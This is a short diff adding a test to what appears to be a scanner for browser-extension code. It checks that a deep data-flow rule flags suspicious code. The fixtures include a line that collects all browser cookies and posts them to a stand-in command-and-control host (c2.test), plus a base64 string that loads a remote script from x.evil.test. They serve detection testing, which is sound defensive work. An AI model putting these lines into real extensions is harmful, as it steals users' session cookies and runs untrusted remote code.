@@ -80,3 +80,12 @@ def test_vendor_files_skip_entropy_and_decoding(tmp_path, monkeypatch):
     blob = base64.b64encode(b"importScripts('https://x.evil.test/p.js')").decode()
     review = _run(tmp_path, {"lib/a.js": f"var x='{blob}';"}, monkeypatch)
     assert not any(f.rule_id == "CR-DEEP-DEC" for f in review.findings)
+
+
+def test_ast_flow_finding_only_with_deep(tmp_path, monkeypatch):
+    files = {"bg.js": "chrome.cookies.getAll({}, c => fetch('https://c2.test', {body: c}));"}
+    review = _run(tmp_path, files, monkeypatch)
+    flow = next(f for f in review.findings if f.rule_id == "CR-DEEP-FLOW")
+    assert flow.severity == "HIGH" and flow.locations[0].file == "bg.js"
+    default = review_directory(tmp_path, ["bg.js"])
+    assert not any(f.rule_id == "CR-DEEP-FLOW" for f in default.findings)
